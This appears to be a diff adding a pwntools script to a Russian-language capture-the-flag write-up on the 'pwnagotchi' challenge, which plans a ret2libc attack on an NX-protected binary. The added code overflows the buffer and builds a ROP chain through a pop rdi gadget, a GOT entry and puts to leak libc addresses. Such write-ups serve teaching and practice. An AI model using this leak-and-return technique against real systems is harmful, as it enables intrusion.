@@ -94,4 +94,24 @@
 Настало время планирования. Мы можем перезаписывать RIP, но при этом у нас имеется NX бит, делающий стек неисполяемым. Предлагаю провернуть атаку re2libc, но есть проблема, которую необходимо решить перед проведением атаки: **необходимо узнать версию libc на сервере**. Для этого сделаем искусственную утечку адресов libc, а затем опеределим версию библиотеки с помощью этих адресов.
 
 ## Перчая часть:    Утечка libc
-    
+```python
+    from pwn import *
+
+    p = process("./pwnagotchi")             # To work locally
+    #p = remote("pwn.hsctf.com", 5005)      # To work on the server
+
+    pop_rdi = p64(0x00000000004009f3)       # We are looking for a gadget for payload
+                                            # In radare2, this is done like this: /R pop rdi
+    getegid_got = p64(0x601048)             # Getegid function address in GOT table
+                                            # In gdb, this is done like this: 
+                                            # x/i <getegid_call_address>
+    puts = p64(0x00000000004007f2)          # Calls to the puts function in a text segment
+
+    offset = 8 * 2 + 4                      # Offset to RIP
+    payload = "A" * offset + pop_rdi + getegid_got + puts
+    p.sendline(payload)                     # Payload Departure
+    print p.recvuntil("s not happy!\n")     # Start reading after the given line
+    leak = p.recvline().strip()             # Save read line
+    leak = binascii.hexlify(leak)           # Convert string characters to hexadecimal numbers
+    print ("Leak is: " + leak)              # Libc leak output
+```
